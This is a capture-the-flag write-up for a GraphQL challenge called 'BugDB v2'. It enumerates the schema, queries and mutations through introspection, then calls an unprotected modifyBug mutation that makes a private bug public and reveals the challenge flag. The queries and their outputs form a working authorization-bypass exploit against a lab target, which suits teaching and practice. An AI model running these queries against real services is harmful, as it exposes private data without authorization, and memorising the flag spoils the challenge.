# BugDB v2

> Web, GraphQL

Sequel to [v1](./BugDB%20v1.md)

## Introspection queries

### Enumerate available schema types

```graphql
{
  __schema {
    types {
      name
      kind
    }
  }
}
```

```json
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Query",
          "kind": "OBJECT"
        },
        {
          "name": "Node",
          "kind": "INTERFACE"
        },
        {
          "name": "ID",
          "kind": "SCALAR"
        },
        {
          "name": "UsersConnection",
          "kind": "OBJECT"
        },
        {
          "name": "PageInfo",
          "kind": "OBJECT"
        },
        {
          "name": "Boolean",
          "kind": "SCALAR"
        },
        {
          "name": "String",
          "kind": "SCALAR"
        },
        {
          "name": "UsersEdge",
          "kind": "OBJECT"
        },
        {
          "name": "Users",
          "kind": "OBJECT"
        },
        {
          "name": "Int",
          "kind": "SCALAR"
        },
        {
          "name": "Bugs",
          "kind": "OBJECT"
        },
        {
          "name": "MyMutations",
          "kind": "OBJECT"
        },
        {
          "name": "modifyBug",
          "kind": "OBJECT"
        },
        {
          "name": "__Schema",
          "kind": "OBJECT"
        },
        {
          "name": "__Type",
          "kind": "OBJECT"
        },
        {
          "name": "__TypeKind",
          "kind": "ENUM"
        },
        {
          "name": "__Field",
          "kind": "OBJECT"
        },
        {
          "name": "__InputValue",
          "kind": "OBJECT"
        },
        {
          "name": "__EnumValue",
          "kind": "OBJECT"
        },
        {
          "name": "__Directive",
          "kind": "OBJECT"
        },
        {
          "name": "__DirectiveLocation",
          "kind": "ENUM"
        }
      ]
    }
  }
}
```

We have some mutations this time...interesting

### Query Discovery

```graphql
{
  __schema {
    queryType {
      fields {
        name
        args {
          name
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
        }
      }
    }
  }
}
```

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "fields": [
          {
            "name": "node",
            "args": [
              {
                "name": "id",
                "type": {
                  "name": null,
                  "kind": "NON_NULL",
                  "ofType": {
                    "name": "ID",
                    "kind": "SCALAR"
                  }
                }
              }
            ]
          },
          {
            "name": "user",
            "args": [
              {
                "name": "before",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "after",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "first",
                "type": {
                  "name": "Int",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "last",
                "type": {
                  "name": "Int",
                  "kind": "SCALAR",
                  "ofType": null
                }
              }
            ]
          },
          {
            "name": "findUser",
            "args": [
              {
                "name": "username",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              }
            ]
          },
          {
            "name": "findBug",
            "args": [
              {
                "name": "_",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              }
            ]
          },
          {
            "name": "allUsers",
            "args": [
              {
                "name": "before",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "after",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "first",
                "type": {
                  "name": "Int",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "last",
                "type": {
                  "name": "Int",
                  "kind": "SCALAR",
                  "ofType": null
                }
              }
            ]
          },
          {
            "name": "allBugs",
            "args": []
          }
        ]
      }
    }
  }
}
```

### Enumerate the Mutations

```graphql
{
  __type(name: "MyMutations") {
    fields {
      name
      args {
        name
        description
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
    }
  }
}
```

```json
{
  "data": {
    "__type": {
      "fields": [
        {
          "name": "modifyBug",
          "args": [
            {
              "name": "id",
              "description": null,
              "type": {
                "name": "Int",
                "kind": "SCALAR",
                "ofType": null
              }
            },
            {
              "name": "private",
              "description": null,
              "type": {
                "name": "Boolean",
                "kind": "SCALAR",
                "ofType": null
              }
            },
            {
              "name": "text",
              "description": null,
              "type": {
                "name": "String",
                "kind": "SCALAR",
                "ofType": null
              }
            }
          ]
        }
      ]
    }
  }
}
```

## What to do

Trying to list bugs using `allBugs()`:

```graphql
query {
  allBugs {
    id
    text
    private
    reporter {
      id
    }
    reporterId
  }
}
```

```json
{
  "data": {
    "allBugs": [
      {
        "id": "QnVnczox",
        "text": "This is an example bug",
        "private": false,
        "reporter": {
          "id": "VXNlcnM6MQ=="
        },
        "reporterId": 1
      }
    ]
  }
}
```

Use the mutation `modifyBug()` to modify the privacy of Bug with id 2:

```graphql
mutation {
  modifyBug(id: 2, private: false) {
    ok
    bug {
      id
      text
      reporterId
    }
  }
}
```

```json
{
  "data": {
    "modifyBug": {
      "ok": true,
      "bug": null
    }
  }
}
```

Query `allBugs()` again:

```json
{
  "data": {
    "allBugs": [
      {
        "id": "QnVnczox",
        "text": "This is an example bug",
        "private": false,
        "reporter": {
          "id": "VXNlcnM6MQ=="
        },
        "reporterId": 1
      },
      {
        "id": "QnVnczoy",
        "text": "^FLAG^0b6a2cde031b3bffd4d3181237e7a8aaa5e54bddd1eed1118834ecd6d879520e$FLAG$",
        "private": false,
        "reporter": {
          "id": "VXNlcnM6Mg=="
        },
        "reporterId": 2
      }
    ]
  }
}
```
